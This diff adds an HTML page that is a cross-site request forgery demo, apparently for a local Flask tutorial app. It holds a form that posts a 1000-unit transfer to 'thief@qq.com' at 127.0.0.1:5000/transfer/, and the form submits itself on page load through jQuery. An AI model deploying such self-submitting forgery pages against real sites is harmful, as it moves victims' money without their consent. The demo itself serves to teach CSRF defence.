@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>转账</title>
+</head>
+<body>
+    <form action="http://127.0.0.1:5000/transfer/" method="post" id="transferform">
+        <table>
+            <tbody>
+            <tr>
+                <td>邮箱</td>
+                <td><input type="email" name="email" value="thief@qq.com"></td>
+            </tr>
+            <tr>
+                <td>转账金额</td>
+                <td><input type="number" name="money" value="1000"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><button type="submit">提交</button></td>
+            </tr>
+            </tbody>
+        </table>
+    </form>
+    <script src="https://libs.cdnjs.net/jquery/3.4.1/jquery.min.js"></script>
+    <script>
+        $(function () {
+            $('#transferform').submit();
+        });
+    </script>
+</body>
+</html>
